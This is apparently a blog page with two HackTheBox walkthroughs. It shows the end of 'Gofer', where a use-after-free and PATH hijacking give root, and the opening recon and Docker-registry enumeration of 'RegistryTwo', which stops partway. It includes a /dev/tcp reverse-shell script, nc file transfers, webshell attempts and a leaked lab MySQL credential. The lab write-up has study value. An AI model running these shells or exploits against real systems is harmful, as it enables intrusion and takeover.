Analyzing &ldquo;notes&rdquo; It seems like it would probably be easiest to analyze the notes binary on my attacker machine, so I&rsquo;ll transfer the file. First, set up a listener:
sudo ufw allow from $RADDR to any port 4445 proto tcp nc -lvnp 4445 &gt; notes Then transfer the file from the target:
nc -nv 10.10.14.4 4445 &lt; /usr/local/bin/notes On both machines, verify the checksum:
sha256sum notes &#x1f44d; The hashes match, so I&rsquo;ll check out the binary on my attacker machine now.
Right away, I see the functionality that should probably be accessed:
Alright, so if the role is already set to &lsquo;admin&rsquo;, then we have the ability to choose option 8 and backup /opt/notes to /root/backups/backup_notes.tar.gz
To set the role, this code is used. It checks the UID and sets the role either to &lsquo;admin&rsquo; (bottom-left pane) or to &lsquo;user&rsquo; (next to bottom-left pane):
Why not try out the application and use it &ldquo;like I am supposed to&rdquo; a few times, to get a feel for how it works?
The program works by prompting the user with this menu:
By selecting 1, typing a name, then selecting 2, you can see your username and your &lsquo;role&rsquo;. My goal for the first part of exploiting this will be to somehow set my &lsquo;role&rsquo; to admin. By selecting 4, entering a word, then selecting 5, you can read back the word (note) that you entered. Really high tech stuff. Selecting 3 deletes the user. But subsequently selecting 2 shows that the role is not deleted. Also, in the place of where the username would be, there is just some junk data! Alright, it&rsquo;s clearly not super well written. Knowing that, let&rsquo;s see what kind of weird behaviour I can coax out of it. Consider the following sequence of actions:
(1) Choose a username: anybody # provide any name (2) # shows Username = anybody, Role = user (3) # Delete the user (4) Write your note: test # make any note (2) # shows Username = test, Role = [blank] Well that&rsquo;s not right! Why did that happen? Look at the code for option (1) (follow the panes with the selected/cyan header):
&hellip;allocates all 40 bytes, then it zeros-off 24 bytes for the username and 16 bytes for the role. Then it fills the role variable according to UID, then it fills the username with the provided string.
A bit of an aside: You can prove this to yourself by seeing that a 24-character username choice (which is 25 with the null byte) actually pre-selects the menu option: &#x261d;&#xfe0f; It used the final &ldquo;4&rdquo; as the menu option, without prompting.
Here&rsquo;s the code for option (3), to delete a user:
&hellip;all it does is free the memory used for the username. After that, selecting option (4) and writing a note follows this code:
&hellip;it allocates more memory, and zeros if off, but it does all this without checking if there is a user currently. If the memory that stored the username / role has just been freed, it&rsquo;s available for the malloc in the option (4) code to claim. This is a classic use-after-free vulnerability.
Exploiting &ldquo;notes&rdquo; As a result of the use-after-free vulnerability shown above, I can probably set BOTH my username and role by providing a note that is 24 + length(&lsquo;admin&rsquo;) = 29 bytes long, and it must end in the letters &lsquo;admin&rsquo;. I&rsquo;ll try using 123456789012345678901234admin:
(1) Choose a username: anybody # provide any name (3) # Delete the user (4) Write your note: 123456789012345678901234admin # 29 bytes long, ends with &#39;admin&#39;: (2) # shows Username = 123456789012345678901234admin, Role = admin &#x1f370; Perfect! That little trick got me the admin role.
Now I&rsquo;ll get back onto the target machine and try the same thing:
Interesting&hellip; Removing leading slashes from member names? This effectively turns them into relative paths. I wonder if I could run the binary from an alternate location and set up some kind of directory traversal. &#x1f914;
To investigate, I&rsquo;ll try running pspy while using option (8) to backup the notes:
&#x1f926;&zwj;&#x2642;&#xfe0f; oh DUH! Why had I not seen that earlier when I was staring right at it in IDA. The notes program is running tar without using an absolute path! This is practically begging for path abuse.
As tbuckley I created a new file called tar in /tmp/Tools:
#!/usr/bin/bash bash -c &#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.4/4444 0&gt;&amp;1&#34; On my attacker machine, I made sure the port was still opened for a reverse shell, and started a socat listener:
sudo ufw allow from $RADDR to any port 4444 proto tcp socat -d -d TCP-LISTEN:4444 STDOUT Then, on the target, I prepended /tmp/Tools to the path, and ran /usr/local/bin/notes:
chmod +x /tmp/Tools/tar export PATH=/tmp/Tools:$PATH /usr/local/bin/notes I repeated the exploit on notes:
(1) Choose a username: anybody # provide any name (3) # Delete the user (4) Write your note: 123456789012345678901234admin # 29 bytes long, ends with &#39;admin&#39;: (2) # shows Username = 123456789012345678901234admin, Role = admin (8) # run the Backup operation, should trigger /tmp/Tools/tar And voila!
&#x1f389; That&rsquo;s a root shell!
From there, simply cat out the flag for those sweet sweet root points:
cat /root/root.txt LESSONS LEARNED Attacker If you run into something that requires some guessing, scripting is your best friend. A little bit of bash scripting goes a long way. When I was trying to find the initial bypass for the proxy, putting my attempts into a double for loop was very useful. 0.0.0.0 can be used to reach the localhost of a webserver. The HTTP specification is written for maximum compatability: Just because localhost and 127.0.0.1 are filtered, that doesn&rsquo;t mean there is no way to reach the local host. Keep a reference of text tricks on-hand. This should include things like directory traversals, null bytes, different ways to phrase a url, encoding tricks, etc. Even if you think you know these well, having a reference on-hand will speed things up. Developers can do fine only knowing what&rsquo;s new. A good hacker needs to know the old stuff too: a working knowledge of BASIC and an awareness of gopher protocol were both useful for this box. Remember the testing mantra: the good, the bad, and the ugly. Playing around with a binary should be the first step of reverse engineering, and you should try good inputs (ones that are intended / produce normal behaviour), bad inputs (clever guesses at what might become an exploit), and ugly inputs (Weird stuff: nonstandard encodings, empty inputs, any corner-case you can think of - these are for discovering vulnerabilities). Remember the easy tricks. Of all things, this &ldquo;hard&rdquo; box was rooted through path abuse. It seemed laughably simple. Don&rsquo;t discount the things that look too easy, just because of the expected difficulty of a box. Defender Denylists are impossible to maintain. It&rsquo;s almost a certainty that something will be missed. On this box, the developer had cleverly denied localhost and /127 from the parameter of http://proxy.gofer.htb/index.php?url=[URL]. However, HTTP is meant for maximum compatability, and there are many ways to specify the localhost. Two other options are 0.0.0.0 and [0:0:0:0:0:ffff:127.0.0.1]. A better way to create the filter would have been an allow-list that only allowed hostnames, with a regex to filter only valid URL constructs - after all, should the employees really have access to&hellip; the type of sites that only use IP addresses?
Never, ever transmit credentials in plaintext. Tom had left his credentials in a cron job that would contact proxy.gofer.htb. Completely unnecessary, and it all took place over good ol&rsquo; unencrypted HTTP.
Development should start with security. I know that Tom was &ldquo;working on&rdquo; the proxy, and probably time-constrained, but the choice of Basic HTTP Authentication (not even Digest Authentication) clearly shows that this aspect of the system was an afterthought. Figure out authentication, then make the feature.
Don&rsquo;t ever re-use credentials. Better yet, get a good authenticator app or start using hardware tokens. Especially do not re-use a credential that was just transmitted in plaintext over http.
Two options: write better code, or use a memory-safe language. The use-after-free vulnerability in the notes app came down to sloppy application logic. When coding anything in a language like C or C++, you must go to great lengths to ensure memory management is perfect.
Path abuse is always preventable. This vulnerability pops up when an application is called using a relative path or only by its name. Prevention is trivial: write your code to call applications by their absolute paths only.
`,url:"https://4wayhandshake.github.io/walkthrough/gofer/"},"https://4wayhandshake.github.io/walkthrough/registrytwo/":{title:"RegistryTwo",tags:["Java","Docker","Null Byte","Path Traversal","Insecure Deserialization","RMI","SOCKS Proxy","Credential Re-use"],categories:["Walkthrough","HTB","Linux","Insane"],content:`INTRODUCTION At the time of writing this guide, RegistryTwo is still active. It was released as the sixth box for HTB&rsquo;s Hackers Clash: Open Beta Season II. This box truly lives up to the level of &ldquo;Insane&rdquo;. Every step requires a very good grasp of hacking fundamentals. RegistryTwo features a mixture of both open-source code and APIs, and homebrew Java applications. Careful code analysis skills and a very strong Java background is essential. This box will require you to either do a bit of coding or extensively modify some existing tools.
Really the only reprieve was that there was very little guesswork involved; every step leads cleanly into the next, forming linear (albeit painfully difficult) path.
RECON nmap scans I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to my target machine&rsquo;s IP, and scanned it with a simple but broad port scan for the top 4000 most popular ports:
sudo nmap -sV -sC -n -Pn --top-ports 4000 -oN nmap/top-4000-ports.txt $RADDR Nmap scan report for 10.10.11.223 Host is up (0.18s latency). Not shown: 3996 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 fab003987e60c2f3118227a135779fd3 (RSA) | 256 f25906dc33b09fa35eb763ff61359dc5 (ECDSA) |_ 256 e3acabea2bd68ef41fb07b050a69a537 (ED25519) 443/tcp open ssl/http nginx 1.14.0 (Ubuntu) |_http-title: Did not follow redirect to https://www.webhosting.htb/ | ssl-cert: Subject: organizationName=free-hosting/stateOrProvinceName=Berlin/countryName=DE | Not valid before: 2023-02-01T20:19:22 |_Not valid after: 2024-02-01T20:19:22 |_ssl-date: TLS randomness does not represent time |_http-server-header: nginx/1.14.0 (Ubuntu) 5000/tcp open ssl/http Docker Registry (API: 2.0) |_http-title: Site doesn&#39;t have a title. | ssl-cert: Subject: commonName=*.webhosting.htb/organizationName=Acme, Inc./stateOrProvinceName=GD/countryName=CN | Subject Alternative Name: DNS:webhosting.htb, DNS:webhosting.htb | Not valid before: 2023-03-26T21:32:06 |_Not valid after: 2024-03-25T21:32:06 5001/tcp open ssl/commplex-link? | ssl-cert: Subject: commonName=*.webhosting.htb/organizationName=Acme, Inc./stateOrProvinceName=GD/countryName=CN | Subject Alternative Name: DNS:webhosting.htb, DNS:webhosting.htb | Not valid before: 2023-03-26T21:32:06 |_Not valid after: 2024-03-25T21:32:06 |_ssl-date: TLS randomness does not represent time | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 404 Not Found | Content-Type: text/plain; charset=utf-8 | X-Content-Type-Options: nosniff | Date: Sun, 23 Jul 2023 21:01:27 GMT | Content-Length: 10 | found | GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Content-Type: text/html; charset=utf-8 | Date: Sun, 23 Jul 2023 21:00:54 GMT | Content-Length: 26 | &lt;h1&gt;Acme auth server&lt;/h1&gt; | HTTPOptions: | HTTP/1.0 200 OK | Content-Type: text/html; charset=utf-8 | Date: Sun, 23 Jul 2023 21:00:55 GMT | Content-Length: 26 |_ &lt;h1&gt;Acme auth server&lt;/h1&gt; | tls-alpn: | h2 |_ http/1.1 Great, so we see four ports open:
SSH on port 22 Webserver using HTTPS on port 443 Docker Registry API on port 5000 Authentication Endpoint (for the Docker registry?) on port 5001 I followed-up with a broader TCP port scan and a UDP port scan, just to make sure I didn&rsquo;t miss anything:
sudo nmap -p- --min-rate 1000 -oN nmap/port-scan.txt $RADDR sudo nmap -p- --min-rate 1000 -sU -oN nmap/udp-port-scan.txt $RADDR Those scans didn&rsquo;t find any additional open ports. I also tried FIN, Maimon, Window, NULL, and Christmas scans: no new information.
Webserver Strategy Added registrytwo.htb to /etc/hosts and proceeded with vhost enumeration, subdomain enumeration, and directory enumeration.
echo &#34;$RADDR registrytwo.htb&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
DOMAIN=registrytwo.htb whatweb https://$DOMAIN &amp;&amp; curl -IL https://$DOMAIN Noticing there was a redirect, I added that too /etc/hosts as well and re-did banner grabbing:
echo &#34;$RADDR www.webhosting.htb&#34; | sudo tee -a /etc/hosts whatweb https://www.webhosting.htb &amp;&amp; curl -IL https://www.webhosting.htb --insecure I performed vhost and subdomain enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt&#34; ffuf -w $WLIST -u https://$RADDR/ -H &#34;Host: www.FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost.md -of md -timeout 4 -ic -ac VHOST enumeration only confirmed the one we already knew about (from the banner-grabbing redirect).
DOMAIN=webhosting.htb ffuf -w $WLIST -u https://FUZZ.$DOMAIN/ -c -t 60 -o fuzzing/subdomain.md -of md -timeout 4 -ic -ac There were no additional results subdomain enumeration, so I proceeded with directory enumeration on https://www.webhosting.htb:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt&#34; feroxbuster -w $WLIST -u https://www.webhosting.htb -A -d 1 -t 100 -T 4 -f --auto-tune --collect-words --filter-status 400,401,402,404,405 --output fuzzing/webhosting-directory.json -k HTTPS reminder: since HTB boxes use self-signed certificates, you must use the -k flag (equivalent to cURL&rsquo;s --insecure).
Directory enumeration gave the following:
Nmap also showed that there was something on port 5000 and 5001. I&rsquo;ll check those, too. We know that both GET and POST should be checked for the service on port 5000. On 5001, only GET:
WLIST=/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt ffuf -w $WLIST:FUZZ -u https://$RADDR:5000/FUZZ -t 80 --recursion --recursion-depth 1 -c -timeout 4 -X GET ffuf -w $WLIST:FUZZ -u https://$RADDR:5000/FUZZ -t 80 --recursion --recursion-depth 1 -c -timeout 4 -X POST ffuf -w $WLIST:FUZZ -u https://$RADDR:5001/FUZZ -t 80 --recursion --recursion-depth 1 -c -timeout 4 &#x261d;&#xfe0f; It may seem odd to perform directory enumeration on the webserver (port 443) using feroxbuster then switch to ffuf for directory enumeration on the API, but this is intentional.
I find that feroxbuster is a lot better at enumerating larger, unstructured things like websites, whereas fuff is the precision tool: much better at fuzzing parameters or enumerating an API.
Exploring the Website Navigating to https://www.webhosting.htb lands us at the index page of shared-hosting service provider. Prominently at the top of the page there are two call-to-action buttons for Login and Register. Below that is typical landing page stuff: feature list, about-us, testimonials, etc.
I read through the page source: there wasn&rsquo;t anything that stood out.
To see how the website works, I&rsquo;ll try registering for their &ldquo;free&rdquo; tier of shared hosting. I registered with name Jimbo and credentials jimbo@fake.mail : password, then was redirected to the login page. Logging in using those credentials brings me to some kind of hosting control panel, where right away I clicked Domains &gt; Create New from the sidebar:
The new domain is created with a default index.html which the user is able to delete, download, or edit.
I tried using the + File button near the top to upload a few files. I uploaded some other html, a php reverse shell, and a php webshell. The html file worked fine. Unfortunately, navigating to either PHP file simply leads to a file download. Trying the webshell using cURL led to a similarly disappointing result:
curl https://www.static-691e5fe41066.webhosting.htb/simple-backdoor.php?cmd=id --insecure Really though&hellip; if that worked, this would definitely not be an Insane difficulty box &#x1f606;
Exploring the API Earlier during directory enumeration, I discovered three API endpoints:
https://10.10.11.223:5000/v2 (GET, POST) https://10.10.11.223:5000/v2/_catalog (GET, POST) https://10.10.11.223:5001/auth (GET) I&rsquo;ll try those each in cURL to try to understand the API a little more:
After a little bit of research and reviewing my nmap scans, I&rsquo;m realizing that this completely matches what I should be seeing for a self-hosted Docker Registry. Given the name of the box, I must be on the right track.
I read a bit of documentation around self-hosted Docker registries. Some of them are completely public, requiring only a simple GET request to the registry endpoint (https://10.10.11.223:5000/v2/_catalog) to query all of the repositories in the registry. From there, you can refine the search by adding the repo to a querystring. However, other registries (like this one) require authentication - hence the error message from the second cURL request shown above.
Some useful resources were the official Docker documentation and this git repo that describes most of the process. The process for querying the Docker registry for a list of repos is described in this article.
The intended procedure of an authenticated registry like this one is:
User queries the registry with no Authentication header. API responses with a challenge in the www-authenticate header, specifying what parameters the User should have included. User obtains an API token by requesting one from the auth endpoint, including the parameters that were referenced in the www-authenticate header from step (2). API responds with an authentication token, implicitly containing the specified parameters from step (3). User re-tries their original query, this time including an Authentication header that includes the token granted from step (4). Scripting the Docker Registry API I wrote a script that obtains a token and tries to query the Docker registry (Work-in-progress. Final code will be linked-to later in this walkthrough):
#!/usr/bin/env python3 import requests import argparse import json # This is necessary for disabling the &#39;verify=False&#39; warning import urllib3 urllib3.disable_warnings() parser = argparse.ArgumentParser( prog=&#39;exploit.py&#39;, description=&#39;I don\\&#39;t know how this program works yet - I\\&#39;m still writing it!&#39;, epilog=&#39;Author: 4wayhandshake&#39;) parser.add_argument(&#39;ip&#39;, help=&#39;IP address of the target. Ex. 10.10.11.224&#39;, type=str) args = parser.parse_args() tgt_url = f&#39;https://{args.ip}&#39; s = requests.session() def authenticate(tgt_url): # GET request to auth endpoint port = 5001 endpoint = &#39;/auth&#39; url = f&#39;{tgt_url}:{port}{endpoint}&#39; # HTTPS reminder: verify=False is like cURL&#39;s --insecure flag. response = s.get(url, verify=False) return response.json() def list_repos(tgt_url, authTokens): port = 5000 endpoint = &#39;/v2/_catalog&#39; url = f&#39;{tgt_url}:{port}{endpoint}&#39; # Need to include the bearer token in the Authorization header headers = {&#39;Authorization&#39;: &#39;Bearer &#39; + authTokens[&#39;token&#39;]} print(f&#39;Request headers:\\n{json.dumps(headers, indent=4)}&#39;) # HTTPS reminder: verify=False is like cURL&#39;s --insecure flag. response = s.get(url, headers=headers, verify=False) print( f&#39;Response: [{response.status_code}] GET {url}\\n&#39; f&#39;Headers:\\n{json.dumps(dict(response.headers), indent=4)}\\n&#39; f&#39;Text:\\n{response.text}&#39; ) tokens = authenticate(tgt_url) list_repos(tgt_url, tokens) Running this shows similar errors to the cURL requests, but now I&rsquo;ve exposed the headers:
&#x1f4bb; Yes, I am fully aware that I could have done this with a properly crafted cURL command, a Bash script, or running the request through Burp Repeater.
I prefer to do this kind of thing in Python because it reduces how many silly mistakes I make. And, if I find I need to do something extra (other than simple REST API interaction), then it&rsquo;s already in a convenient format to extend its usage. Plus, a little programming practice never hurt anyone &#x1f40d;
The response headers indicate that my token request is missing the service Docker registry and scope registry:catalog:*. To accommodate this, I added some query parameters to the token request by modifying the authenticate function:
def authenticate(tgt_url): port = 5001 endpoint = &#39;/auth&#39; url = f&#39;{tgt_url}:{port}{endpoint}&#39; params = { &#39;service&#39;: &#39;Docker registry&#39;, &#39;scope&#39;: &#39;registry:catalog:*&#39; } response = s.get(url, params=params, verify=False) return response.json() Running this again, I was overjoyed to see it had worked (quite easily):
Wonderful! The Docker Registry query was successful, and showed that there is only a single repo inside: hosting-app. Now that the name of the repo is known, I might be able to follow this plan (inspired by a walkthrough to the precursor to this box, Registry):
query /v2/[repo name]/tags/list to get the tags for the repo
Once any of the tags are known, I can check /v2/[repo name]/manifests/[tag] to get the manifest for that tag
The manifest should show the hashes of each commit in as &lsquo;blobSum&rsquo;. Individual commits are identified uniquely by their hash.
Download a copy of that commit by making a request for that hash, example:
/v2/[repo name]/blobs/sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b&#39; If I&rsquo;m lucky, I can simply use tar -xzvf to unpack it.
To try out this procedure, I added a function get_tags() to do the first step of the above list. The function is as follows:
def get_tags(tgt_url, authTokens, repo_name): port = 5000 endpoint = f&#39;/v2/{repo_name}/tags/list&#39; url = f&#39;{tgt_url}:{port}{endpoint}&#39; # Need to include the bearer token in the Authorization header headers = {&#39;Authorization&#39;: &#39;Bearer &#39; + authTokens[&#39;token&#39;]} print(f&#39;Request headers:\\n{json.dumps(headers, indent=4)}&#39;) # HTTPS reminder: verify=False is like cURL&#39;s --insecure flag. response = s.get(url, headers=headers, verify=False) print( f&#39;Response: [{response.status_code}] GET {url}\\n&#39; f&#39;Headers:\\n{json.dumps(dict(response.headers), indent=4)}\\n&#39; f&#39;Text:\\n{response.text}&#39; ) Then called the function after the obtaining the repo list:
tokens = authenticate(tgt_url, &#39;Docker registry&#39;, &#39;registry:catalog:*&#39;) list_repos(tgt_url, tokens) get_tags(tgt_url, tokens, &#39;hosting-app&#39;) This results in the following error:
Ok, not bad! Looks like the API is complaining that I didn&rsquo;t request a new token for the new scope that my query falls under. Where the previous query was &ldquo;list the catalog&rdquo;, this falls under &ldquo;pull a repo&rdquo;. No problem, I&rsquo;ll just authenticate again before the next query.
Obviously, this is getting a little repetitive, so I refactored the code a bit for this version:
[imports and argparse, etc] ... s = requests.session() def authenticate(tgt_url, service, scope): # GET request to auth endpoint port = 5001 endpoint = &#39;/auth&#39; url = f&#39;{tgt_url}:{port}{endpoint}&#39; params = { &#39;service&#39;: service, &#39;scope&#39;: scope } print(f&#39;Obtaining auth token for service: &#34;{service}&#34; and scope:&#34;{scope}&#34;&#39;) response = s.get(url, params=params, verify=False) return response.json() def query_registry(tgt_url, authTokens, endpoint, verbose=False): port = 5000 url = f&#39;{tgt_url}:{port}{endpoint}&#39; # Need to include the bearer token in the Authorization header headers = {&#39;Authorization&#39;: &#39;Bearer &#39; + authTokens[&#39;token&#39;]} if verbose: print(f&#39;Request headers:\\n{json.dumps(headers, indent=4)}&#39;) # HTTPS reminder: verify=False is like cURL&#39;s --insecure flag. response = s.get(url, headers=headers, verify=False) print( f&#39;Response: [{response.status_code}] GET {url}\\n&#39; f&#39;Headers:\\n{json.dumps(dict(response.headers), indent=4)}\\n&#39; f&#39;Text:\\n{response.text}&#39; ) # List the repos in the registry tokens = authenticate(tgt_url, &#39;Docker registry&#39;, &#39;registry:catalog:*&#39;) query_registry(tgt_url, tokens, &#39;/v2/_catalog&#39;) # List the tags for the repo tokens = authenticate(tgt_url, &#39;Docker registry&#39;, &#39;repository:hosting-app:pull&#39;) query_registry(tgt_url, tokens, &#39;/v2/hosting-app/tags/list&#39;) &#x1f44d; It looks like adding in a second authentication step was exactly what was needed:
The only tag on the repo is latest. Next, I&rsquo;ll modify the code as follows:
Without adding another authenticate() call, I&rsquo;ll add a query_registry() call to get the manifest for that tag. This should produce an error: by reading the www-authenticate header&rsquo;s contents, I will know what to add into the next authenticate() call. Add in a new authenticate() call using the proper service and scope for the query I want to perform. I re-ran the script after adding this one line:
query_registry(tgt_url, tokens, &#39;/v2/hosting-app/manifests/latest&#39;) (The output goes one for pages and pages&hellip; )
Wow, ok! No need to re-authenticate. I guess the query to obtain the manifest for the latest tag still falls under the same scope as &ldquo;pull a repo&rdquo;. If I understand correctly, those blobSum hashes are already in chronological order, with the most recent commit at the top.
The most recent hash is: sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
I added a function to download the blob:
def download_blob(tgt_url, authTokens, endpoint, outfile, verbose=False): port = 5000 url = f&#39;{tgt_url}:{port}{endpoint}&#39; headers = {&#39;Authorization&#39;: &#39;Bearer &#39; + authTokens[&#39;token&#39;]} if verbose: print(f&#39;Request headers:\\n{json.dumps(headers, indent=4)}&#39;) response = s.get(url, headers=headers, verify=False, stream=True) with open(outfile, &#39;wb&#39;) as f: for chunk in response.iter_content(chunk_size=1024): if chunk: f.write(chunk) print(f&#39;]\\nFile downloaded: {url}&#39;) And added a call to the function after all the other stuff:
# List the repos in the registry tokens = authenticate(tgt_url, &#39;Docker registry&#39;, &#39;registry:catalog:*&#39;) query_registry(tgt_url, tokens, &#39;/v2/_catalog&#39;) # List the tags for the repo tokens = authenticate(tgt_url, &#39;Docker registry&#39;, &#39;repository:hosting-app:pull&#39;) query_registry(tgt_url, tokens, &#39;/v2/hosting-app/tags/list&#39;) # Read the manifest for the tag query_registry(tgt_url, tokens, &#39;/v2/hosting-app/manifests/latest&#39;) # Download the specified commit blob_hash = &#39;sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4&#39; download_endpt = f&#39;/v2/hosting-app/blobs/{blob_hash}&#39; outfile = &#39;downloaded-blob.tar.gz&#39; download_blob(tgt_url, tokens, download_endpt, outfile) The script ran and the blob downloaded, so I checked its contents:
file downloaded-blob.tar.gz # Yep, it&#39;s a gzip archive... tar -zxvf downloaded-blob.tar.gz However, the downloaded file was only a single 1kB chunk&hellip; it didn&rsquo;t unpack into anything. I should have known: If I recall correctly, a docker image is built later by layer using overlayFS - of course getting a single blob wouldn&rsquo;t do the job! &#x1f926;&zwj;&#x2642;&#xfe0f; Duh!
Assembling the Docker Image Following in the footsteps of 0xdf&rsquo;s guide to this box&rsquo;s predecessor, Registry, I looked into using a different tool to download all the blobs and unpack them into a whole docker image. Theoretically, this should completely replace the docker pull operation that one would normally run with something like DockerHub.
Thankfully, as referenced in 0xdf&rsquo;s guide, there is already a tool that does exactly this for private Docker registries: https://github.com/NotSoSecure/docker_fetch, so I&rsquo;ll try that out!
&#x1f61e; Sadly, it won&rsquo;t be quite that easy! This NotSoSecure/docker_fetch repo does not work with the token-based auth mechanism that our Docker registry uses. At least the code is Python, and really quite similar to what I&rsquo;ve already written, so I&rsquo;ll simply just work on modifying that code to do what I need it to do.
It wasn&rsquo;t actually too big of a change. I added one function to my script to list all blobs from the manifest, called list_blobs(). Then I modified the download_blob() function a bit to parameterize the blob&rsquo;s hash and the output directory for the file:
def list_blobs(qry_response): blob_arr = [] data = json.loads(qry_response.content) if (&#34;fsLayers&#34; not in data) or (&#39;blobSum&#39; not in data[&#39;fsLayers&#39;][0]): return blob_arr for x in data[&#34;fsLayers&#34;]: blob = x[&#39;blobSum&#39;].split(&#34;:&#34;)[1] # Just get the hash part if blob not in blob_arr: blob_arr.append(blob) return blob_arr def download_blob(tgt_url, authTokens, directory, blob_hash): port = 5000 url = f&#39;{tgt_url}:{port}/v2/hosting-app/blobs/sha256:{blob_hash}&#39; headers = {&#39;Authorization&#39;: &#39;Bearer &#39; + authTokens[&#39;token&#39;]} outfile = os.path.join(directory, f&#39;{blob_hash}.tar.gz&#39;) response = s.get(url, headers=headers, verify=False) with open(outfile, &#39;wb&#39;) as f: f.write(response.content) print(f&#39;Blob downloaded: {outfile}&#39;) # List the repos in the registry tokens = authenticate(tgt_url, &#39;Docker registry&#39;, &#39;registry:catalog:*&#39;) query_registry(tgt_url, tokens, &#39;/v2/_catalog&#39;) # List the tags for the repo tokens = authenticate(tgt_url, &#39;Docker registry&#39;, &#39;repository:hosting-app:pull&#39;) query_registry(tgt_url, tokens, &#39;/v2/hosting-app/tags/list&#39;) # Read the manifest for the tag. Make a list of all the blobs resp = query_registry(tgt_url, tokens, &#39;/v2/hosting-app/manifests/latest&#39;) blob_hashes = list_blobs(resp) # Check that the directory exists first directory = os.path.join(basedir,blob_dir) if not os.path.isdir(directory): os.makedirs(directory) # Download all the blobs into the directory for blob_hash in blob_hashes: download_blob(tgt_url, tokens, directory, blob_hash) For the full python script, please check out my git repo where I posted the code.
I ran my finished script, and all of the blobs were downloaded:
Then, again following in the footsteps of the Registry walkthrough by 0xdf, I expanded all the blobs into a single directory, fs:
mkdir fs cat blobs/*.tar.gz | tar -xzf - -C fs -i &#x1f352; Exactly as I was hoping, the end result is a Docker image filesystem:
Inside this fs directory, I made a new file called Dockerfile. Much earlier, banner-grabbing revealed that www.webhosting.htb was running Ubuntu, so I wrote the dockerfile using Ubuntu:latest as a parent image:
# Set the base image FROM ubuntu # Copy the entire filesystem into the image COPY . / # Set the working directory WORKDIR / # Set the default command to run when starting the container CMD [&#34;/bin/bash&#34;] The repo where the code was obtained was called hosting-app. So, using this Dockerfile I built the whole filesystem into a Docker image But first, I copied my toolbox into /tmp/Tools :
mkdir ./tmp/Tools cp ~/Tools/STAGING/* ./tmp/Tools docker build -t hosting-app . You can verify this worked by running docker images.
Exploring the Docker Image Now that there is an image for hosting-app on my system, I ran it with an interactive terminal:
Oddly enough, this container appeared to be lacking the modern niceties such as ls and ln &#x1f440;
This was, of course, a lie. All those essential tools were sitting there in /bin. I simply had to add it to the PATH:
PATH=/bin:$PATH I spent a little bit of time looking through the container, but nothing really stood out as very important. So why not check the filesystem for credentials? The perfect tool for this is trufflehog. I ran it locally, over the filesystem that I made the docker image from:
trufflehog filesystem fs 2&gt;/dev/null | tee -a trufflehog.log I don&rsquo;t know if my repos were out of date or something (running updating &amp; upgrading right now), but the version of Trufflehog available to my kali machine over apt did not have the option to run trufflehog filesystem &lt;directory&gt;.
To get an appropriate version (v3.45.0 at the time of writing this), I downloaded the binary from the Trufflehog git repo.
&#x1f437; Trufflehog immediately found something good! The very first result is a MySQL credential:
For copy-paste sake, that MySQL connection is on localhost:3306, with credential root : O8lBvQUBPU4CMbvJmYqY.
I started up the container again, to check if I could log into MySQL. However, MySQL is not running. In fact, it doesn&rsquo;t even appear to be installed &#x1f914; I&rsquo;m wondering if maybe the real juicy info is the mention of RMI and its port: registry.webhosting.htb:9002?
The container does have a copy of Tomcat installed, though. It&rsquo;s installed at /usr/local/tomcat. That might be useful. I can also see it has a .war file inside the /webapps subdirectory. Since .war files are essentially zip archives, I&rsquo;ll take a look inside:
I tried opening up template.html, and found that this is definitely the web app running on www.webhosting.htb:
That&rsquo;s great - now I know I have a copy of the code for a webapp running live on the target. Taking a deeper look through the .war file, I noticed there is a bunch of code in its /WEB-INF directory:
Now that&rsquo;s quite interesting! There is a directory for rmi classes! Inside are three .class files: AbstractFile, FileService, and RMIClientWrapper. To view these, I&rsquo;ll need to decompile them. Thankfully this is trivial: I just ran the files through http://www.javadecompilers.com.
Once taking a look through those files, I noticed that RMIClientWrapper.java imports another class, com.htb.hosting.utils.config.Settings, and this class is responsible for loading the rmi host and rmi port. I&rsquo;ll decompile that class and take a look at it as well.
All of this decompiling was getting a little tedious, so I found another tool called jd-gui that decompiles the whole .war file in one step, allowing you to look through the code inside a GUI - very nice!
Unsurprisingly, the Settings class loads a bunch of data from the hosting.ini file that I found earlier. Those variables could be easily controlled without even changing the code of the webapp &#x1f44d;. To get a better picture of how this might all culminate in some kind of exploit or attack, I decided to do some research on Java RMI.
What is Java RMI? I had never heard of Java RMI, so I did some research on it. RMI stands for remote method invocation. The system includes the RMI server, which hosts objects and exposes some of their methods so that the RMI client can invoke those methods remotely. Before that can happen, the RMI server must have already registered those methods in the RMI registry. The official Java documentation shows neatly how this all works. This image is pretty much the gist of it though:
Since /etc/hosting.ini holds details about the RMI host called registry.webhosting.htb, it&rsquo;s probably safe to assume it is referring to the RMI registry. And since the RMI registry and RMI server are probably on the same host, this docker image is probably the RMI Client.
If all of that is true, there might be some stray java code, either as .jar, .java, or .class sitting around in the filesystem. After all, for the RMI client to remotely invoke any methods, it needs to import the interface to those methods first.
While investigating if there are any tools to query the RMI Registry, I came across the PayloadAllTheThings page on it. I don&rsquo;t think any of the methods listed there will work though, as I seem to not be able to contact the supposed port 9002 from my attacker box: it is filtered.
I see this going one of two ways:
